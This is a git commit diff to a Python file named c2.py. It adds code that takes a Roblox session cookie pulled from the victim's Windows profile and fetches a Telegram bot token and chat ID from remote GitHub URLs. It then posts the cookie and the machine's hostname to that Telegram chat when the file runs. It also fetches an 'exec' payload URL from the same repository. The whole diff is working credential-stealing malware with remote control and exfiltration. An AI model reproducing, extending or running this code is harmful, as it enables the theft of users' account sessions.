266a2db2925a19ec6c0feb8edb9c26225d573ae2
rb6sevent-cyber <rb6sevent@gmail.com>
2026-05-06 20:52:55 +0200

    Update c2.py

--- c2.py
+++ c2.py
@@ -5,6 +5,9 @@ import win32crypt
 import json
 import re
 
+import requests
+import socket
+
 def retrieve_roblox_cookies():
     user_profile = os.getenv("USERPROFILE", "")
     roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
@@ -43,4 +46,41 @@ def retrieve_roblox_cookies():
         except Exception as e:
             return
 
-print(retrieve_roblox_cookies())
+url = "https://raw.githubusercontent.com/czawapro-dotcom/ahc1/refs/heads/main/Data"
+urlEX = "https://raw.githubusercontent.com/czawapro-dotcom/ahc1/refs/heads/main/exec"
+
+def retrieveData(args):
+    if args == "exec":
+        response = requests.get(urlEX)
+        if response.status_code == 200:
+            return response.text
+
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        
+        if args == "ChatID":
+            return data["chat"]
+        elif args == "Token":
+            return data["token"]
+        elif args == "retrieve":
+            return data["retrieve"]
+        elif args == "item":
+            return data["item"]
+        elif args == "topic":
+            return data["topic"]
+
+def send_webhook(cookie, args):
+    chatID = retrieveData("ChatID")
+    token = retrieveData("Token")
+
+    if args == True:
+        webhook = f"https://api.telegram.org/bot{token}/sendMessage"
+        data={"chat_id": chatID,"text": f"\n\n{socket.gethostname()}:\n\n```{cookie}```\n\n\n开发者DC: @kemicn"}
+
+        response = requests.post(webhook, json=data)
+    else:
+        print("Webhook is disabled.")
+
+
+send_webhook(retrieve_roblox_cookies(), True)
